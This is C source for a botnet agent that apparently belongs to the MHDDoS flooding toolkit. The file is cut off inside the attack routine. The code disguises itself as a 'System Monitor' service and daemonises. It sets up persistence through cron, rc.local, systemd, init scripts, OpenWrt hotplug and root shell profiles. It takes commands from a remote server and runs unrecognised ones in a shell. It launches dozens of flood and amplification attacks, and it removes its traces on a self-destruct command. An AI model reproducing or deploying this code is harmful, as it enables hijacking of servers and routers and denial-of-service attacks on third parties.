#include "mhddos.h"
#include <stdarg.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <dirent.h>

#ifndef SERVER_HOST
#define SERVER_HOST "0.0.0.0"
#endif
#ifndef SERVER_PORT
#define SERVER_PORT 8443
#endif
#define RECONNECT_DELAY 5
#define CMD_BUF_SIZE 8192
#define MAX_ARGS 128
#define PID_FILE "/tmp/.mhd.pid"
#define INSTALL_NAME ".sysmon"
#define SERVICE_NAME "sysmon"

#ifndef MSG_NOSIGNAL
#define MSG_NOSIGNAL 0
#endif

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

static volatile sig_atomic_t g_child_pid = 0;
static volatile sig_atomic_t g_attack_running = 0;
static volatile sig_atomic_t g_stop_requested = 0;
static int g_server_sock = -1;
static volatile int *g_shared_running = NULL;
static pid_t *g_worker_pids = NULL;
static int g_worker_count = 0;
static char g_self_path[1024] = {0};
static char g_install_path[512] = {0};

static int tornar_daemon(void) {
    pid_t pid;
    pid = fork();
    if (pid < 0) return -1;
    if (pid > 0) _exit(0);
    if (setsid() < 0) return -1;
    signal(SIGHUP, SIG_IGN);
    pid = fork();
    if (pid < 0) return -1;
    if (pid > 0) _exit(0);
    chdir("/");
    umask(0);
    for (int fd = 0; fd < 1024; fd++) {
        close(fd);
    }
    int fd = open("/dev/null", O_RDWR);
    if (fd != -1) {
        dup2(fd, 0);
        dup2(fd, 1);
        dup2(fd, 2);
        if (fd > 2) close(fd);
    }
    return 0;
}

static int is_pid_alive(pid_t pid) {
    if (pid <= 0) return 0;
    if (kill(pid, 0) == 0) return 1;
    if (errno == EPERM) return 1;
    return 0;
}

static int get_exe_path_of_pid(pid_t pid, char *buf, int buflen) {
    char link[64];
    ssize_t r;
    snprintf(link, sizeof(link), "/proc/%d/exe", (int)pid);
    r = readlink(link, buf, buflen - 1);
    if (r <= 0) return 0;
    buf[r] = 0;
    return 1;
}

static void kill_pid_tree(pid_t pid) {
    char path[128];
    char line[256];
    DIR *d;
    struct dirent *de;
    pid_t child;
    FILE *f;

    d = opendir("/proc");
    if (d) {
        while ((de = readdir(d)) != NULL) {
            if (de->d_name[0] < '0' || de->d_name[0] > '9') continue;
            child = (pid_t)atoi(de->d_name);
            if (child <= 1 || child == pid) continue;
            snprintf(path, sizeof(path), "/proc/%d/status", child);
            f = fopen(path, "r");
            if (!f) continue;
            while (fgets(line, sizeof(line), f)) {
                if (strncmp(line, "PPid:", 5) == 0) {
                    pid_t ppid = (pid_t)atoi(line + 5);
                    if (ppid == pid) {
                        kill_pid_tree(child);
                        kill(child, SIGKILL);
                        waitpid(child, NULL, WNOHANG);
                    }
                    break;
                }
            }
            fclose(f);
        }
        closedir(d);
    }
    kill(pid, SIGKILL);
    waitpid(pid, NULL, WNOHANG);
}

static int file_contains(const char *filepath, const char *needle) {
    FILE *f;
    char line[1024];
    f = fopen(filepath, "r");
    if (!f) return 0;
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, needle)) { fclose(f); return 1; }
    }
    fclose(f);
    return 0;
}

static int can_write_to(const char *path) {
    char dir[512];
    char test[560];
    char *slash;
    FILE *f;
    strncpy(dir, path, sizeof(dir) - 1);
    dir[sizeof(dir) - 1] = 0;
    slash = strrchr(dir, '/');
    if (slash) *slash = 0;
    else strcpy(dir, "/tmp");
    snprintf(test, sizeof(test), "%s/.wt_%d", dir, getpid());
    f = fopen(test, "w");
    if (!f) return 0;
    fprintf(f, "x");
    fclose(f);
    unlink(test);
    return 1;
}

static void remove_old_persistence(const char *old_bin_path) {
    char cmd[1024];
    char path[256];
    const char *bn;
    const char *profiles[] = { "/root/.profile", "/root/.bashrc", "/etc/profile", NULL };
    const char *cron_files[] = {
        "/var/spool/cron/crontabs/root", "/etc/crontabs/root", NULL
    };
    int i;

    if (!old_bin_path || old_bin_path[0] == 0) return;

    bn = strrchr(old_bin_path, '/');
    bn = bn ? bn + 1 : old_bin_path;

    snprintf(path, sizeof(path), "/etc/cron.d/%s", SERVICE_NAME);
    unlink(path);

    if (file_contains("/etc/rc.local", old_bin_path) || file_contains("/etc/rc.local", bn)) {
        snprintf(cmd, sizeof(cmd),
            "grep -v '%s' /etc/rc.local > /etc/rc.local.tmp && mv /etc/rc.local.tmp /etc/rc.local 2>/dev/null", bn);
        system(cmd);
    }

    snprintf(cmd, sizeof(cmd),
        "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null", bn);
    system(cmd);

    for (i = 0; cron_files[i]; i++) {
        if (!file_contains(cron_files[i], old_bin_path) && !file_contains(cron_files[i], bn)) continue;
        snprintf(cmd, sizeof(cmd),
            "grep -v '%s' %s > %s.tmp && mv %s.tmp %s 2>/dev/null",
            bn, cron_files[i], cron_files[i], cron_files[i], cron_files[i]);
        system(cmd);
    }

    snprintf(path, sizeof(path), "/etc/init.d/S99%s", SERVICE_NAME);
    unlink(path);
    snprintf(path, sizeof(path), "/etc/init.d/%s", SERVICE_NAME);
    unlink(path);

    snprintf(cmd, sizeof(cmd),
        "rm -f /etc/rc2.d/S99%s /etc/rc3.d/S99%s /etc/rc5.d/S99%s 2>/dev/null",
        SERVICE_NAME, SERVICE_NAME, SERVICE_NAME);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "systemctl stop %s.service 2>/dev/null", SERVICE_NAME);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "systemctl disable %s.service 2>/dev/null", SERVICE_NAME);
    system(cmd);
    snprintf(path, sizeof(path), "/etc/systemd/system/%s.service", SERVICE_NAME);
    unlink(path);
    system("systemctl daemon-reload 2>/dev/null");

    snprintf(path, sizeof(path), "/etc/hotplug.d/iface/99-%s", SERVICE_NAME);
    unlink(path);

    for (i = 0; profiles[i]; i++) {
        if (!file_contains(profiles[i], old_bin_path) && !file_contains(profiles[i], bn)) continue;
        snprintf(cmd, sizeof(cmd),
            "grep -v '%s' %s > %s.tmp && mv %s.tmp %s 2>/dev/null",
            bn, profiles[i], profiles[i], profiles[i], profiles[i]);
        system(cmd);
    }
}

static void replace_old_instance(void) {
    FILE *f;
    int old_pid = 0;
    char old_exe[1024] = {0};

    f = fopen(PID_FILE, "r");
    if (!f) return;

    if (fscanf(f, "%d", &old_pid) != 1 || old_pid <= 0) {
        fclose(f);
        unlink(PID_FILE);
        return;
    }
    fclose(f);

    if (get_exe_path_of_pid((pid_t)old_pid, old_exe, sizeof(old_exe))) {
        if (strcmp(old_exe, g_self_path) != 0) {
            remove_old_persistence(old_exe);
            unlink(old_exe);
        }
    }

    if (is_pid_alive((pid_t)old_pid)) {
        kill_pid_tree((pid_t)old_pid);
        usleep(200000);
        if (is_pid_alive((pid_t)old_pid)) {
            kill(old_pid, SIGKILL);
            usleep(500000);
        }
    }

    unlink(PID_FILE);

    {
        const char *known_paths[] = {
            "/usr/bin/" INSTALL_NAME,
            "/usr/sbin/" INSTALL_NAME,
            "/bin/" INSTALL_NAME,
            "/sbin/" INSTALL_NAME,
            "/opt/" INSTALL_NAME,
            "/var/" INSTALL_NAME,
            "/etc/" INSTALL_NAME,
            "/overlay/upper/usr/bin/" INSTALL_NAME,
            "/overlay/upper/sbin/" INSTALL_NAME,
            NULL
        };
        int i;
        struct stat st;
        for (i = 0; known_paths[i]; i++) {
            if (strcmp(known_paths[i], g_self_path) == 0) continue;
            if (stat(known_paths[i], &st) == 0) unlink(known_paths[i]);
        }
    }
}

static void acquire_lock(void) {
    FILE *f;
    f = fopen(PID_FILE, "w");
    if (f) {
        fprintf(f, "%d\n", (int)getpid());
        fclose(f);
    }
}

static void release_lock(void) {
    unlink(PID_FILE);
}

static int get_num_cpus(void) {
    long n = 1;
#ifdef _SC_NPROCESSORS_ONLN
    n = sysconf(_SC_NPROCESSORS_ONLN);
#endif
    if (n < 1) n = 1;
    if (n > 128) n = 128;
    return (int)n;
}

static void get_arch(char *buf, int len) {
    struct utsname u;
    if (uname(&u) == 0) {
        strncpy(buf, u.machine, len - 1);
        buf[len - 1] = 0;
    } else {
        strcpy(buf, "unknown");
    }
}

static void get_osinfo(char *buf, int len) {
    struct utsname u;
    if (uname(&u) == 0) {
        snprintf(buf, len, "%s %s", u.sysname, u.release);
    } else {
        strcpy(buf, "unknown");
    }
}

static int check_root(void) {
    return (geteuid() == 0);
}

static int copy_file(const char *src, const char *dst) {
    FILE *in, *out;
    char buf[4096];
    size_t n;
    in = fopen(src, "rb");
    if (!in) return 0;
    out = fopen(dst, "wb");
    if (!out) { fclose(in); return 0; }
    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
        if (fwrite(buf, 1, n, out) != n) {
            fclose(in); fclose(out); unlink(dst); return 0;
        }
    }
    fclose(in);
    fclose(out);
    chmod(dst, 0755);
    chown(dst, 0, 0);
    return 1;
}

static int is_tmpfs(const char *path) {
    FILE *f;
    char line[512];
    char fs_type[64] = {0};
    int best_len = 0;
    f = fopen("/proc/mounts", "r");
    if (!f) f = fopen("/etc/mtab", "r");
    if (!f) return 0;
    while (fgets(line, sizeof(line), f)) {
        char dev[256], mp[256], fst[64];
        if (sscanf(line, "%255s %255s %63s", dev, mp, fst) >= 3) {
            int mplen = strlen(mp);
            if (strncmp(path, mp, mplen) == 0 && mplen > best_len) {
                best_len = mplen;
                strncpy(fs_type, fst, sizeof(fs_type) - 1);
            }
        }
    }
    fclose(f);
    if (strcmp(fs_type, "tmpfs") == 0 || strcmp(fs_type, "ramfs") == 0 || strcmp(fs_type, "devtmpfs") == 0)
        return 1;
    return 0;
}

static int find_install_location(void) {
    const char *candidates[] = {
        "/usr/bin/" INSTALL_NAME,
        "/usr/sbin/" INSTALL_NAME,
        "/bin/" INSTALL_NAME,
        "/sbin/" INSTALL_NAME,
        "/opt/" INSTALL_NAME,
        "/var/" INSTALL_NAME,
        "/etc/" INSTALL_NAME,
        "/overlay/upper/usr/bin/" INSTALL_NAME,
        "/overlay/upper/sbin/" INSTALL_NAME,
        NULL
    };
    int i;
    struct stat st;
    for (i = 0; candidates[i]; i++) {
        if (stat(candidates[i], &st) == 0 && !is_tmpfs(candidates[i])) {
            strncpy(g_install_path, candidates[i], sizeof(g_install_path) - 1);
            return 1;
        }
    }
    for (i = 0; candidates[i]; i++) {
        if (can_write_to(candidates[i]) && !is_tmpfs(candidates[i])) {
            strncpy(g_install_path, candidates[i], sizeof(g_install_path) - 1);
            return 1;
        }
    }
    return 0;
}

static int persist_rc_local(const char *binpath) {
    FILE *f;
    char *content = NULL;
    long fsize;
    struct stat st;
    if (!can_write_to("/etc/rc.local")) return 0;
    if (file_contains("/etc/rc.local", binpath)) return 1;
    if (stat("/etc/rc.local", &st) == 0) {
        f = fopen("/etc/rc.local", "r");
        if (f) {
            fsize = st.st_size;
            content = malloc(fsize + 1);
            if (content) { fread(content, 1, fsize, f); content[fsize] = 0; }
            fclose(f);
        }
    }
    f = fopen("/etc/rc.local", "w");
    if (!f) { free(content); return 0; }
    if (content) {
        char *exit_line = strstr(content, "\nexit 0");
        if (!exit_line) exit_line = strstr(content, "\nexit");
        if (exit_line) {
            fwrite(content, 1, exit_line - content, f);
            fprintf(f, "\n%s &\n", binpath);
            fprintf(f, "%s", exit_line);
        } else {
            fprintf(f, "%s", content);
            fprintf(f, "\n%s &\n", binpath);
        }
    } else {
        fprintf(f, "#!/bin/sh\n%s &\nexit 0\n", binpath);
    }
    fclose(f);
    chmod("/etc/rc.local", 0755);
    free(content);
    return 1;
}

static int persist_crontab(const char *binpath) {
    char cmd[1024];
    char line[512];
    FILE *p;
    int has_crontab = 0;
    p = popen("which crontab 2>/dev/null", "r");
    if (p) { if (fgets(line, sizeof(line), p)) has_crontab = 1; pclose(p); }
    if (!has_crontab) return 0;
    p = popen("crontab -l 2>/dev/null", "r");
    if (p) {
        while (fgets(line, sizeof(line), p)) {
            if (strstr(line, binpath)) { pclose(p); return 1; }
        }
        pclose(p);
    }
    snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null; echo '@reboot %s &') | crontab - 2>/dev/null", binpath);
    return (system(cmd) == 0);
}

static int persist_busybox_cron(const char *binpath) {
    const char *cron_dirs[] = {
        "/var/spool/cron/crontabs", "/var/spool/cron",
        "/etc/crontabs", "/etc/cron.d", NULL
    };
    int i;
    struct stat st;
    char filepath[512];
    for (i = 0; cron_dirs[i]; i++) {
        if (stat(cron_dirs[i], &st) != 0 || !S_ISDIR(st.st_mode)) continue;
        if (strcmp(cron_dirs[i], "/etc/cron.d") == 0)
            snprintf(filepath, sizeof(filepath), "%s/%s", cron_dirs[i], SERVICE_NAME);
        else
            snprintf(filepath, sizeof(filepath), "%s/root", cron_dirs[i]);
        if (file_contains(filepath, binpath)) return 1;
        if (!can_write_to(filepath)) continue;
        FILE *f = fopen(filepath, "a");
        if (!f) continue;
        if (strcmp(cron_dirs[i], "/etc/cron.d") == 0) {
            fprintf(f, "@reboot root %s &\n", binpath);
            fprintf(f, "*/5 * * * * root %s &\n", binpath);
        } else {
            fprintf(f, "@reboot %s &\n", binpath);
            fprintf(f, "*/5 * * * * %s &\n", binpath);
        }
        fclose(f);
        return 1;
    }
    return 0;
}

static int persist_initd(const char *binpath) {
    const char *script_paths[] = { "/etc/init.d/S99" SERVICE_NAME, "/etc/init.d/" SERVICE_NAME, NULL };
    int i;
    struct stat st;
    FILE *f;
    char cmd[512];
    const char *bn;
    bn = strrchr(binpath, '/');
    bn = bn ? bn + 1 : binpath;
    for (i = 0; script_paths[i]; i++) {
        if (stat(script_paths[i], &st) == 0) return 1;
        if (!can_write_to(script_paths[i])) continue;
        f = fopen(script_paths[i], "w");
        if (!f) continue;
        fprintf(f, "#!/bin/sh /etc/rc.common\n");
        fprintf(f, "START=99\nSTOP=10\n");
        fprintf(f, "start() {\n\t%s &\n}\n", binpath);
        fprintf(f, "stop() {\n\tkillall %s 2>/dev/null\n}\n", bn);
        fprintf(f, "case \"$1\" in\n");
        fprintf(f, "start) start ;;\nstop) stop ;;\nrestart) stop; start ;;\n*) start ;;\nesac\n");
        fclose(f);
        chmod(script_paths[i], 0755);
        if (stat("/etc/rc.common", &st) == 0) {
            snprintf(cmd, sizeof(cmd), "%s enable 2>/dev/null", script_paths[i]);
            system(cmd);
        }
        snprintf(cmd, sizeof(cmd),
            "ln -sf %s /etc/rc2.d/S99%s 2>/dev/null;"
            "ln -sf %s /etc/rc3.d/S99%s 2>/dev/null;"
            "ln -sf %s /etc/rc5.d/S99%s 2>/dev/null",
            script_paths[i], SERVICE_NAME, script_paths[i], SERVICE_NAME, script_paths[i], SERVICE_NAME);
        system(cmd);
        return 1;
    }
    return 0;
}

static int persist_systemd(const char *binpath) {
    char svc[256];
    struct stat st;
    FILE *f;
    snprintf(svc, sizeof(svc), "/etc/systemd/system/%s.service", SERVICE_NAME);
    if (stat("/run/systemd/system", &st) != 0) return 0;
    if (stat(svc, &st) == 0) return 1;
    if (!can_write_to(svc)) return 0;
    f = fopen(svc, "w");
    if (!f) return 0;
    fprintf(f, "[Unit]\nDescription=System Monitor\nAfter=network.target\n\n");
    fprintf(f, "[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=30\nUser=root\n\n", binpath);
    fprintf(f, "[Install]\nWantedBy=multi-user.target\n");
    fclose(f);
    system("systemctl daemon-reload 2>/dev/null");
    snprintf(svc, sizeof(svc), "systemctl enable %s.service 2>/dev/null", SERVICE_NAME);
    system(svc);
    return 1;
}

static int persist_openwrt(const char *binpath) {
    struct stat st;
    char hotplug[256];
    const char *bn;
    FILE *f;
    bn = strrchr(binpath, '/');
    bn = bn ? bn + 1 : binpath;
    if (stat("/etc/openwrt_release", &st) != 0 && stat("/etc/openwrt_version", &st) != 0) return 0;
    snprintf(hotplug, sizeof(hotplug), "/etc/hotplug.d/iface/99-%s", SERVICE_NAME);
    if (!can_write_to(hotplug)) return 0;
    f = fopen(hotplug, "w");
    if (!f) return 0;
    fprintf(f, "#!/bin/sh\n[ \"$ACTION\" = \"ifup\" ] && {\npidof %s >/dev/null || %s &\n}\n", bn, binpath);
    fclose(f);
    chmod(hotplug, 0755);
    return 1;
}

static int persist_profile(const char *binpath) {
    const char *profiles[] = { "/root/.profile", "/root/.bashrc", "/etc/profile", NULL };
    const char *bn;
    int i, count = 0;
    bn = strrchr(binpath, '/');
    bn = bn ? bn + 1 : binpath;
    for (i = 0; profiles[i]; i++) {
        if (file_contains(profiles[i], binpath)) { count++; continue; }
        if (!can_write_to(profiles[i])) continue;
        FILE *f = fopen(profiles[i], "a");
        if (!f) continue;
        fprintf(f, "\npidof %s >/dev/null 2>&1 || %s &\n", bn, binpath);
        fclose(f);
        count++;
    }
    return count > 0;
}

static void install_persistence(void) {
    struct stat st;
    if (!check_root()) return;
    if (g_self_path[0] == 0) return;
    if (!find_install_location()) return;
    if (strcmp(g_self_path, g_install_path) != 0) {
        if (stat(g_install_path, &st) != 0) {
            if (!copy_file(g_self_path, g_install_path)) {
                strncpy(g_install_path, g_self_path, sizeof(g_install_path) - 1);
                if (is_tmpfs(g_install_path)) return;
            }
        } else {
            unlink(g_install_path);
            if (!copy_file(g_self_path, g_install_path)) {
                strncpy(g_install_path, g_self_path, sizeof(g_install_path) - 1);
                if (is_tmpfs(g_install_path)) return;
            }
        }
    }
    persist_rc_local(g_install_path);
    persist_crontab(g_install_path);
    persist_busybox_cron(g_install_path);
    persist_initd(g_install_path);
    persist_systemd(g_install_path);
    persist_openwrt(g_install_path);
    persist_profile(g_install_path);
}

static void remove_persistence(void) {
    char cmd[1024];
    char path[256];
    const char *bn;
    const char *profiles[] = { "/root/.profile", "/root/.bashrc", "/etc/profile", NULL };
    const char *cron_files[] = {
        "/var/spool/cron/crontabs/root", "/etc/crontabs/root", NULL
    };
    int i;

    if (g_install_path[0] == 0 && g_self_path[0])
        strncpy(g_install_path, g_self_path, sizeof(g_install_path) - 1);

    bn = strrchr(g_install_path, '/');
    bn = bn ? bn + 1 : g_install_path;

    unlink(g_install_path);

    snprintf(path, sizeof(path), "/etc/cron.d/%s", SERVICE_NAME);
    unlink(path);

    if (file_contains("/etc/rc.local", g_install_path)) {
        snprintf(cmd, sizeof(cmd),
            "grep -v '%s' /etc/rc.local > /etc/rc.local.tmp && mv /etc/rc.local.tmp /etc/rc.local 2>/dev/null",
            bn);
        system(cmd);
    }

    snprintf(cmd, sizeof(cmd),
        "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null", bn);
    system(cmd);

    for (i = 0; cron_files[i]; i++) {
        if (!file_contains(cron_files[i], g_install_path)) continue;
        snprintf(cmd, sizeof(cmd),
            "grep -v '%s' %s > %s.tmp && mv %s.tmp %s 2>/dev/null",
            bn, cron_files[i], cron_files[i], cron_files[i], cron_files[i]);
        system(cmd);
    }

    snprintf(path, sizeof(path), "/etc/init.d/S99%s", SERVICE_NAME);
    unlink(path);
    snprintf(path, sizeof(path), "/etc/init.d/%s", SERVICE_NAME);
    unlink(path);

    snprintf(cmd, sizeof(cmd),
        "rm -f /etc/rc2.d/S99%s /etc/rc3.d/S99%s /etc/rc5.d/S99%s 2>/dev/null",
        SERVICE_NAME, SERVICE_NAME, SERVICE_NAME);
    system(cmd);

    snprintf(cmd, sizeof(cmd), "systemctl stop %s.service 2>/dev/null", SERVICE_NAME);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "systemctl disable %s.service 2>/dev/null", SERVICE_NAME);
    system(cmd);
    snprintf(path, sizeof(path), "/etc/systemd/system/%s.service", SERVICE_NAME);
    unlink(path);
    system("systemctl daemon-reload 2>/dev/null");

    snprintf(path, sizeof(path), "/etc/hotplug.d/iface/99-%s", SERVICE_NAME);
    unlink(path);

    for (i = 0; profiles[i]; i++) {
        if (!file_contains(profiles[i], g_install_path)) continue;
        snprintf(cmd, sizeof(cmd),
            "grep -v '%s' %s > %s.tmp && mv %s.tmp %s 2>/dev/null",
            bn, profiles[i], profiles[i], profiles[i], profiles[i]);
        system(cmd);
    }

    snprintf(cmd, sizeof(cmd), "killall -9 %s 2>/dev/null", bn);
    system(cmd);
}

static int tcp_connect(const char *host, int port, int timeout_sec) {
    struct sockaddr_in addr;
    struct hostent *he;
    struct timeval tv;
    int sock, flag;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_aton(host, &addr.sin_addr) == 0) {
        he = gethostbyname(host);
        if (!he) { close(sock); return -1; }
        memcpy(&addr.sin_addr, he->h_addr, he->h_length);
    }
    tv.tv_sec = timeout_sec; tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(sock); return -1; }
    tv.tv_sec = 120;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    flag = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
    return sock;
}

static int send_all(int sock, const char *buf, int len) {
    int sent = 0, n;
    while (sent < len) {
        n = send(sock, buf + sent, len - sent, MSG_NOSIGNAL);
        if (n <= 0) { if (n < 0 && errno == EINTR) continue; return -1; }
        sent += n;
    }
    return sent;
}

static int send_line(int sock, const char *fmt, ...) {
    char buf[CMD_BUF_SIZE];
    va_list ap;
    int n;
    va_start(ap, fmt);
    n = vsnprintf(buf, sizeof(buf) - 1, fmt, ap);
    va_end(ap);
    if (n <= 0) return -1;
    buf[n] = '\n';
    return send_all(sock, buf, n + 1);
}

static int recv_line(int sock, char *buf, int buflen) {
    int pos = 0, r;
    char c;
    while (pos < buflen - 1) {
        r = recv(sock, &c, 1, 0);
        if (r < 0) { if (errno == EINTR) continue; return -1; }
        if (r == 0) return -1;
        if (c == '\n') break;
        if (c != '\r') buf[pos++] = c;
    }
    buf[pos] = 0;
    return pos;
}

static volatile int *create_shared_int(void) {
    volatile int *p;
    int fd;
    fd = open("/dev/zero", O_RDWR);
    if (fd >= 0) {
        p = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
        close(fd);
        if (p != MAP_FAILED) { *p = 0; return p; }
    }
    p = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (p != MAP_FAILED) { *p = 0; return p; }
    p = malloc(sizeof(int));
    if (p) *p = 0;
    return p;
}

static void kill_workers(void) {
    int i;
    if (g_shared_running) *g_shared_running = 0;
    for (i = 0; i < g_worker_count; i++) {
        if (g_worker_pids[i] > 0) kill(g_worker_pids[i], SIGKILL);
    }
    for (i = 0; i < g_worker_count; i++) {
        if (g_worker_pids[i] > 0) { waitpid(g_worker_pids[i], NULL, 0); g_worker_pids[i] = 0; }
    }
    g_worker_count = 0;
}

static void stop_attack(void) {
    if (g_child_pid > 0) {
        kill(g_child_pid, SIGKILL);
        waitpid(g_child_pid, NULL, 0);
        g_child_pid = 0;
    }
    g_attack_running = 0;
}

static void sigchld_fn(int sig) {
    int st; pid_t p;
    (void)sig;
    while ((p = waitpid(-1, &st, WNOHANG)) > 0) {
        if (p == g_child_pid) { g_child_pid = 0; g_attack_running = 0; }
    }
}

static void coord_sig_fn(int sig) {
    (void)sig;
    g_stop_requested = 1;
}

static void do_attack(int argc, char **argv);

static void set_amp(layer4_args_t *a, const uint8_t *p, int l, int port) {
    memcpy(a->amp_payload, p, l);
    a->amp_payload_len = l;
    a->amp_port = port;
}

static void run_l7(layer7_args_t *a) {
    switch (a->method) {
        case METHOD_GET: flood_get(a); break;
        case METHOD_POST: flood_post(a); break;
        case METHOD_STRESS: flood_stress(a); break;
        case METHOD_PPS: flood_pps(a); break;
        case METHOD_EVEN: flood_even(a); break;
        case METHOD_OVH: flood_ovh(a); break;
        case METHOD_NULL: flood_null(a); break;
        case METHOD_COOKIE: flood_cookie(a); break;
        case METHOD_APACHE: flood_apache(a); break;
        case METHOD_XMLRPC: flood_xmlrpc(a); break;
        case METHOD_BOT: flood_bot(a); break;
        case METHOD_DYN: flood_dyn(a); break;
        case METHOD_SLOW: flood_slow(a); break;
        case METHOD_CFBUAM: flood_cfbuam(a); break;
        case METHOD_AVB: flood_avb(a); break;
        case METHOD_DOWNLOADER: flood_downloader(a); break;
        case METHOD_RHEX: flood_rhex(a); break;
        case METHOD_STOMP: flood_stomp(a); break;
        case METHOD_GSB: flood_gsb(a); break;
        case METHOD_CFB: flood_cfb(a); break;
        case METHOD_BYPASS: flood_bypass(a); break;
        case METHOD_DGB: flood_dgb(a); break;
        case METHOD_TOR: flood_tor(a); break;
        case METHOD_KILLER: flood_killer(a); break;
        default: flood_get(a); break;
    }
}

static void run_l4(layer4_args_t *a) {
    switch (a->method) {
        case METHOD_TCP: flood_tcp(a); break;
        case METHOD_UDP: flood_udp(a); break;
        case METHOD_SYN: flood_syn(a); break;
        case METHOD_ICMP: flood_icmp(a); break;
        case METHOD_VSE: flood_vse(a); break;
        case METHOD_TS3: flood_ts3(a); break;
        case METHOD_MCPE: flood_mcpe(a); break;
        case METHOD_FIVEM: flood_fivem(a); break;
        case METHOD_FIVEM_TOKEN: flood_fivem_token(a); break;
        case METHOD_OVH_UDP: flood_ovhudp(a); break;
        case METHOD_MINECRAFT: flood_minecraft(a); break;
        case METHOD_CPS: flood_cps(a); break;
        case METHOD_CONNECTION: flood_connection(a); break;
        case METHOD_MCBOT: flood_mcbot(a); break;
        case METHOD_MEM: case METHOD_NTP: case METHOD_DNS_AMP:
        case METHOD_ARD: case METHOD_CLDAP: case METHOD_CHAR:
        case METHOD_RDP: flood_amp(a); break;
        default: break;
    }
}

static int is_known_method(const char *m) {
    const char *l4[] = {"TCP","UDP","SYN","ICMP","VSE","TS3","MCPE","FIVEM","FIVEM-TOKEN","OVH-UDP","MINECRAFT","CPS","CONNECTION","MCBOT","MEM","NTP","DNS","ARD","CLDAP","CHAR","RDP",NULL};
    const char *l7[] = {"GET","POST","STRESS","PPS","EVEN","OVH","NULL","COOKIE","APACHE","XMLRPC","BOT","DYN","SLOW","CFBUAM","AVB","DOWNLOADER","RHEX","STOMP","GSB","CFB","BYPASS","DGB","TOR","KILLER",NULL};
    int i;
    for (i = 0; l4[i]; i++) if (strcmp(m, l4[i]) == 0) return 1;
    for (i = 0; l7[i]; i++) if (strcmp(m, l7[i]) == 0) return 1;
    return 0;
}

static void exec_system_cmd(const char *cmd) {
    pid_t pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        if (g_server_sock >= 0) close(g_server_sock);
        signal(SIGCHLD, SIG_DFL);
        signal(SIGPIPE, SIG_IGN);
        execl("/bin/sh", "sh", "-c", cmd, NULL);
        _exit(1);
    }
    g_child_pid = pid;
    g_attack_running = 0;
}

static void exec_attack(int argc, char **argv) {
    char m[64];
    int i;
    pid_t pid;
    method_t method;

    if (argc < 2) return;
    strncpy(m, argv[1], sizeof(m) - 1);
    m[sizeof(m) - 1] = 0;
    for (i = 0; m[i]; i++) {
        if (m[i] >= 'a' && m[i] <= 'z') m[i] -= 32;
    }
    if (strcmp(m, "STOP") == 0) {
        stop_attack();
        return;
    }
    if (strcmp(m, "SELFDESTRUCT") == 0) {
        stop_attack();
        remove_persistence();
        if (g_self_path[0]) unlink(g_self_path);
        release_lock();
        _exit(0);
    }
    if (!is_known_method(m)) {
        char fullcmd[CMD_BUF_SIZE];
        int pos = 0;
        for (i = 1; i < argc && pos < (int)sizeof(fullcmd) - 2; i++) {
            if (i > 1) fullcmd[pos++] = ' ';
            int len = strlen(argv[i]);
            if (pos + len < (int)sizeof(fullcmd) - 1) {
                strcpy(fullcmd + pos, argv[i]);
                pos += len;
            }
        }
        fullcmd[pos] = 0;
        exec_system_cmd(fullcmd);
        return;
    }
    method = parse_method(m);
    if (method == METHOD_UNKNOWN || argc < 3) return;
    stop_attack();
    pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        if (g_server_sock >= 0) close(g_server_sock);
        signal(SIGCHLD, SIG_DFL);
        signal(SIGPIPE, SIG_IGN);
        signal(SIGTERM, coord_sig_fn);
        signal(SIGINT, coord_sig_fn);
        do_attack(argc, argv);
        _exit(0);
    }
    g_child_pid = pid;
    g_attack_running = 1;
}

static void do_attack(int argc, char **argv) {
    char m[64];
    char url[4096];
    int i, timer, workers;
    time_t start;
    struct rlimit rl;
    method_t method;
    url_t target;
    char host_ip[256];
    char target_ip[256];
    int port, rpc, proxy_ty;
    char proxy_path[512];
    char **uas = NULL;
    char **refs = NULL;
    int ua_cnt = 0, ref_cnt = 0;
    proxy_t *proxies = NULL;
    int proxy_cnt = 0;
    proxy_type_t pt;
    pid_t wpid;
    int protocolid;

    rl.rlim_cur = 1024;
    rl.rlim_max = 1024;
    setrlimit(RLIMIT_NOFILE, &rl);
    srand((unsigned)(time(NULL) ^ getpid()));
    get_local_ip(g_local_ip, sizeof(g_local_ip));

    strncpy(m, argv[1], sizeof(m) - 1);
    m[sizeof(m) - 1] = 0;
    for (i = 0; m[i]; i++) {
        if (m[i] >= 'a' && m[i] <= 'z') m[i] -= 32;
    }

    method = parse_method(m);
    if (method == METHOD_UNKNOWN) _exit(1);

    workers = get_num_cpus();
    g_shared_running = create_shared_int();
    if (!g_shared_running) _exit(1);
    g_worker_pids = calloc(workers, sizeof(pid_t));
    if (!g_worker_pids) _exit(1);
    g_worker_count = 0;
    g_stop_requested = 0;

    memset(url, 0, sizeof(url));
